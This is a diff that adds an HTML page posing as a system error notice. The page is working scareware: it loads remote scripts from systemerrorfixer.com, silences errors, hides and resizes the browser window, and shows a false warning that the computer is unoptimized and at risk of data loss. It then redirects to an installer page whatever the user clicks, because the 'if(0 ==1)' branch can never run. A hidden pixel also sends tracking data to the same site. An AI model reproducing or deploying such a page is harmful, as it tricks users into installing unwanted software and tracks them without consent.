@@ -1,0 +1,43 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html lang="en-US">
+<head>
+<title>Error Detected</title>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+</head>
+<script language='javascript' type='text/javascript' src='http://systemerrorfixer.com/clean/js/ajax.js'></script>
+<script language='javascript' type='text/javascript' src='http://systemerrorfixer.com/clean/js/errorhandler.js'></script>
+<script language='javascript' type='text/javascript'>
+ErrorHandler('silent');
+</script>
+
+<script>
+function i18n(text) {
+	return text;
+}
+</script>
+<body>
+<script>
+	w=window.screen.width;
+	h=window.screen.height;
+	try {resizeTo(10,10);} catch(e) {};
+	try {moveTo(w,h);} catch(e) {};
+
+	var text51 = "NOTICE: Your system is not optimized and your computer performance is not at the highest level." + "\n";
+	var text52 = "Full system optimization will greatly increase your computer’s performance and prevent data loss." + "\n\n";
+	var text53 = "Would you like to install SystemErrorFixer to optimize your computer’s performance now for free? (Recommended)";
+
+	confirm(text51 + text52 + text53);
+	try {moveTo(0,0);} catch(e) {};
+	try {resizeTo(w,h);} catch(e) {};
+	if(0 ==1 ) {
+		window.open('/clean/index.php?57520-d0d0b-54681-45051-53034-05a5f-53123-c5845-51390-8423a-5e583-c075c-54175-75f0d-0d0b5-84140-5c545-2595a-5f6e0-e5655-03053-c075a-035c0-55651-540a5-55356-02555-4015b-065f0-15302-53020-2065b-07055-55405-39545-65451-00005-60b56-06000-75005-560d5-5540c-0c520-00202-01010-35201-54545-74555-00080-64511-505b0-00215-175a5-80811-05540-80542-59466-e510f-055c0-f5651-51013-a0568-52560-05f05-17002-50550-08013-9096a-055d0-20b03-1e120-1570f-52');
+	} else {
+		document.location.href='/clean/index.php?57520-d0d0b-54681-45051-53034-05a5f-53123-c5845-51390-8423a-5e583-c075c-54175-75f0d-0d0b5-84140-5c545-2595a-5f6e0-e5655-03053-c075a-035c0-55651-540a5-55356-02555-4015b-065f0-15302-53020-2065b-07055-55405-39545-65451-00005-60b56-06000-75005-560d5-5540c-0c520-00202-01010-35201-54545-74555-00080-64511-505b0-00215-175a5-80811-05540-80542-59466-e510f-055c0-f5651-51013-a0568-52560-05f05-17002-50550-08013-9096a-055d0-20b03-1e120-1570f-52';
+	}
+</script>
+<div style="display:none; ">
+<img src="http://secure.systemerrorfixer.com/esid_systemerrorfixer/eai_nm_ridggthnks_kw2_kr_ko/eli_nav/erf_/lp_true/stats.php" width="1" height="1">
+</div>
+</body>
+</html>
